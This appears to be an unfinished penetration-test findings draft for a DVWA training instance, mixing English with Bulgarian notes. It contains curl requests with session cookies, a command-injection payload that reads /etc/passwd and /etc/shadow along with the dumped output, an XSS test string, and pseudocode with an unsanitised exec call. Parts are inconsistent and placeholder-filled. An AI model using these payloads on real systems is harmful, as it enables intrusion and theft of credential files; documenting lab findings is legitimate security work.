# Findings

**1. Server side request forgery.**
Severity: Medium
CVSS 3.1 score - 5.4
Scoring Vector: AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:L 
za devs e tozi skor nujen - vector

Description:
Server-Side Request Forgery (SSRF) is a type of vulnerability that occurs when an attacker can manipulate or forge requests from a vulnerable server. Essentially, it allows the attacker to send crafted requests from the server, bypassing traditional security measures.

It was discovered that the tested DVWA instance contains a SSRF vulnerability in the "Ping a device" functionality. The vulnerability allows an attacker to scan the internal infrastructure of the app by performinga a `ping` to an internal IPv4 and IPv6 addrs. It can be triggered by executing the following request - 
<!-- Intercept on on burp -->
```
curl "http://13.40.186.44:4280/vulnerabilities/exec/index.php" ^
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" ^
  -H "Accept-Language: en-US,en;q=0.9" ^
  -H "Cache-Control: max-age=0" ^
  -H "Content-Type: application/x-www-form-urlencoded" ^
  -H "Cookie: security=impossible; PHPSESSID=648d1da998067207fd6e0469251ef323" ^
  -H "Origin: http://13.40.186.44:4280" ^
  -H "Proxy-Connection: keep-alive" ^
  -H "Referer: http://13.40.186.44:4280/vulnerabilities/exec/index.php" ^
  -H "Upgrade-Insecure-Requests: 1" ^
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36" ^
  --data-raw "ip=a.a&Submit=Submit&user_token=3ecb5335791264efa4abb4f572d523a8" ^
  --compressed ^
  --insecure
```

the results show as below:
Response
```
<pre>PING 0.0.0.0 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=127 time=0.019 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=127 time=0.037 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=127 time=0.036 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=127 time=0.036 ms

--- 0.0.0.0 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3091ms
rtt min/avg/max/mdev = 0.019/0.032/0.037/0.007 ms
</pre>
```

Recommendations: Limit pings to all internal 


***2. SSRF ***
Severity: Critial
CVSS 3.1 score - 9.9
Scoring Vector: 


Response -

Remote code execution chatgpt response za towa

It was discovered that XSADSD contins an rce vulnerability in the ping a device func that allwos attacer cli commands

```
curl "http://13.40.186.44:4280/vulnerabilities/exec/" ^
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" ^
  -H "Accept-Language: en-US,en;q=0.9" ^
  -H "Cache-Control: max-age=0" ^
  -H "Content-Type: application/x-www-form-urlencoded" ^
  -H "Cookie: PHPSESSID=648d1da998067207fd6e0469251ef323; security=low" ^
  -H "Origin: http://13.40.186.44:4280" ^
  -H "Proxy-Connection: keep-alive" ^
  -H "Referer: http://13.40.186.44:4280/vulnerabilities/exec/" ^
  -H "Upgrade-Insecure-Requests: 1" ^
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36" ^
  --data-raw "ip=1.1.1.1^%^3B+ls+^%^2Fetc^%^2Fshadow&Submit=Submit" ^
  --compressed ^
  --insecure
  ```

  where the following payload is used:
  ```
  1.1.1.; cat /etc/passwd
  ```

highlight in word - 
```
PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
64 bytes from 1.1.1.1: icmp_seq=1 ttl=41 time=2.51 ms
64 bytes from 1.1.1.1: icmp_seq=2 ttl=41 time=2.54 ms
64 bytes from 1.1.1.1: icmp_seq=3 ttl=41 time=2.55 ms
64 bytes from 1.1.1.1: icmp_seq=4 ttl=41 time=2.54 ms

--- 1.1.1.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 2.507/2.533/2.545/0.015 ms
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

Reccomendtations: EMergency implement of client req payload filterin on the backedn where only ipv4 nad ipv6 addres are permitted
Notes - a key contat person 


NB!!!!
xapp i meta exploit
<!-- xss, server, template inj, command injection, file inclusion, unrestricted file report -->


Ako nqma filter taka tr izglejda payload-a
123"</div><script>alert(1)</script>



// Notes for the ingame

func exec_ip(HttpReq cReq) HttpResp {
    ip_str = cReq.formData.get('ip');
    is_valid_ip = regexp.verify(ip_str, REGEX_IP_FORMAT)

    <!-- if !is_valid_ip:
        return HttpResp(400, 'Invalid IP format') -->

    if ip_str is in INTERNAL_IPS:
        return HttpResp(400, 'Invalid IP Internal.')

    
    cmd_str = 'ping -c 1 ' + ip_str; // 1.1.1.1;
    stdout = exec(cmd_str)
    
    return HttpResp(200, stdout)

    // towa e ako sme umni - ima prowerki i nqma regex

    // direktno priema wsi4ko
}

ping -c {1.1.1.1 + ls -l}

server side request moje da e